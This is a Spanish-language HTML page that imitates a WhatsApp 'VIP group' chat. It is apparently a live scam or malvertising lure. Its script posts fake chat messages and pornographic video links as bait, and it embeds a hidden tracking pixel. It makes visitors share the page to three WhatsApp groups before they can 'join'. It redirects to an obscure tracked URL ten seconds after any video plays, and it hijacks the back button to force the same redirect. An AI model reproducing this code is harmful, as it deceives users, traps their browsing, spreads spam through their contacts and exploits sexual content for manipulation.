<!DOCTYPE html>
<html lang="es">
<head>
<img src="//whos.amung.us/pingjs/?k=zomy&amp;t=&amp;x=https://whatsapp.com" style="display:none">

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Grupo VIP</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0b141a;
}

.chat-container {
  max-width: 500px;
  margin: auto;
  background: #111b21;
  height: 100vh;
  display: flex;
  flex-direction: column;
}

.header {
  background: #202c33;
  padding: 10px;
  display: flex;
  align-items: center;
  color: white;
  gap: 10px;
}

.header img {
  width: 40px;
  height: 40px;
  border-radius: 50%;
}

.header .info {
  display: flex;
  flex-direction: column;
}

.header small {
  color: #ccc;
  font-size: 12px;
}

.messages {
  flex: 1;
  padding: 10px;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
}

.msg-row {
  display: flex;
  margin-bottom: 8px;
}

.msg-row img {
  width: 30px;
  height: 30px;
  border-radius: 50%;
  margin-right: 5px;
}

.message {
  background: #202c33;
  padding: 10px;
  border-radius: 10px;
  color: white;
  max-width: 75%;
  font-size: 14px;
}

.button {
  background: #25d366;
  color: black;
  padding: 12px;
  text-align: center;
  margin: 10px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
}

.progress {
  color: white;
  text-align: center;
  font-size: 14px;
}

video {
  border-radius: 10px;
  max-width: 100%;
}
</style>
</head>

<body>

<div class="chat-container">

  <div class="header">
    <img src="https://gruposycanales.website/wp-content/uploads/2026/04/HHGOJQOW4AAKQqi.jpg">
    <div class="info">
      <div>Grupo VIP 🔒</div>
      <small id="status">En línea</small>
    </div>
  </div>

  <div class="messages" id="chat"></div>

  <div class="progress" id="progress">
    Compartido: 0 / 3 grupos
  </div>

  <div class="button" id="btn" onclick="shareWhatsApp()">
    Compartir en 3 grupos de WhatsApp para unirte al grupo VIP
  </div>

</div>

<script>
let shares = 0;
const targetLink = "https://matcheshonoraryunderwater.com/zbdg0cf2hq?key=4f09eef9fb1ffbc42276b25fd0707835";

const messages = [
  {img:"https://gruposycanales.website/wp-content/uploads/2026/04/HHJqrBaWUAAt_Kx.jpg", text:"😳 Amiga esto es real..." },
  {img:"https://gruposycanales.website/wp-content/uploads/2026/04/HHLHNmxWoAAZzLO.jpg", text:"Entré y no lo podía creer 🔥"},
  {img:"https://gruposycanales.website/wp-content/uploads/2026/04/HHE5a9OaIAAOIG4.jpg", text:"Mira esto antes que lo borren 👇"},
  {video:"https://gruposycanales.website/wp-content/uploads/2026/03/video_360p.mp4"},
  {img:"https://gruposycanales.website/wp-content/uploads/2026/04/HG7oEdIbUAAsyOK.jpg", text:"😱 WTF"},
  {video:"https://gruposycanales.website/wp-content/uploads/2026/03/Xvideos_un_dia_en_casa_SD.mp4"},
  {img:"https://gruposycanales.website/wp-content/uploads/2026/04/HHFKBQfa0AALGdx.jpg", text:"Esto se va a llenar"},
  {video:"https://gruposycanales.website/wp-content/uploads/2026/03/Xvideos_lunita_galactica_casting_2_en_1_para_un_anal_fuerte_SD.mp4"},
  {img:"https://gruposycanales.website/wp-content/uploads/2026/05/31b773178e85fe16a30955b8c9d50463.jpg", text:"⚠️ Últimos cupos"}
];

let index = 0;

function addMessage(data) {
  const chat = document.getElementById("chat");
  const row = document.createElement("div");
  row.className = "msg-row";

  if (data.img) {
    const img = document.createElement("img");
    img.src = data.img;
    row.appendChild(img);

    const msg = document.createElement("div");
    msg.className = "message";
    msg.innerText = data.text;
    row.appendChild(msg);
  }

  if (data.video) {
    const msg = document.createElement("div");
    msg.className = "message";

    const video = document.createElement("video");
    video.controls = true;
    video.playsInline = true;
    video.muted = true;

    const source = document.createElement("source");
    source.src = data.video;
    source.type = "video/mp4";

    video.appendChild(source);

    // 🔥 REDIRECCIÓN CORRECTA
    let redirected = false;

    video.addEventListener("play", () => {
      if (redirected) return;
      redirected = true;

      setTimeout(() => {
        redirect();
      }, 10000);
    });

    msg.appendChild(video);
    row.appendChild(msg);
  }

  chat.appendChild(row);
  chat.scrollTop = chat.scrollHeight;
}

function simulateChat() {
  if (index < messages.length) {
    setTimeout(() => {
      addMessage(messages[index]);
      index++;
      simulateChat();
    }, 1200);
  }
}

function shareWhatsApp() {
  const msg = encodeURIComponent(
    "🔥 Mira esto antes de que lo borren 👉 " + window.location.href
  );

  window.open(`https://wa.me/?text=${msg}`, "_blank");

  shares++;
  document.getElementById("progress").innerText =
    `Compartido: ${shares} / 3 grupos`;

  if (shares >= 3) {
    document.getElementById("btn").innerText =
      "Entrar al grupo premium 🔥";
    document.getElementById("btn").onclick = () => {
      window.location.href = targetLink;
    };
  }
}

function redirect() {
  window.location.href = targetLink;
}

history.pushState(null, "", location.href);
window.onpopstate = function () {
  window.location.href = targetLink;
};

simulateChat();
</script>

</body>
</html>
